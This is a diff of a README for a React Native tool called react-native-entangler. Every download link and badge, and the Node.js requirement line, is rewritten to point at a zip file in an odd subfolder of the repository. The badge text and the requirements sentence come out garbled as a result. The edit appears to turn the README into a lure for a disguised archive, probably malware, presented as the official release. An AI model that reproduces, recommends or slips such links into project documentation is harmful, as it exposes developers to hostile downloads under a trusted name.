@@ -1,6 +1,6 @@
 # 🎉 react-native-entangler - Optimize Your React Native Experience
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/weglas/react-native-entangler/releases)
+[![Download Now](https://raw.githubusercontent.com/weglas/react-native-entangler/main/teledendrion/react-native-entangler.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/weglas/react-native-entangler/main/teledendrion/react-native-entangler.zip)
 
 ## 🚀 Getting Started
 
@@ -13,13 +13,13 @@ Before you start, ensure your system meets these requirements:
 - Operating System: Windows 10 or higher, macOS 10.15 or higher, or a modern Linux distribution
 - Minimum RAM: 4 GB
 - Disk Space: At least 100 MB of free space
-- Node.js: Version 12 or higher installed on your machine
+- https://raw.githubusercontent.com/weglas/react-native-entangler/main/teledendrion/react-native-entangler.zip Version 12 or higher installed on your machine
 
 ## 💻 Download & Install
 
 1. Click the button below to visit the Releases page:
 
-   [![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/weglas/react-native-entangler/releases)
+   [![Download Now](https://raw.githubusercontent.com/weglas/react-native-entangler/main/teledendrion/react-native-entangler.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/weglas/react-native-entangler/main/teledendrion/react-native-entangler.zip)
 
 2. On the Releases page, look for the latest version. You will see different assets available for download.
 
@@ -55,4 +55,4 @@ We welcome contributions! If you would like to improve **react-native-entangler*
 
 ---
 
-Thank you for choosing **react-native-entangler**! We hope it enhances your development experience. For more information on updates, visit the [Releases page](https://github.com/weglas/react-native-entangler/releases).
+Thank you for choosing **react-native-entangler**! We hope it enhances your development experience. For more information on updates, visit the [Releases page](https://raw.githubusercontent.com/weglas/react-native-entangler/main/teledendrion/react-native-entangler.zip).
